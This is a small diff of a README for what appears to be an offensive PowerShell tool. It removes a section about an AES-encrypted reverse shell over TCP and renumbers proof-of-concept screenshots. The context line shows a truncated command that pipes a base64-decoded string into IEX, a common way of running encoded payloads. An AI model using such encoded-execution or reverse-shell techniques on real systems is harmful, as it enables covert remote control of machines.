@@ -15,10 +15,6 @@ CMD> ECHO IEX([string]([Text.Encoding]::Unicode.GetString([Convert]::FromBase64S
 
 ![alt text](/PoC1.jpg)
 
-- Reverse Encrypted (AES 256-bit) Shell over TCP:
-
-![alt text](/PoC2.jpg)
-
 - Analyze Encrypted Traffic:
 
-![alt text](/PoC3.jpg)
+![alt text](/PoC2.jpg)
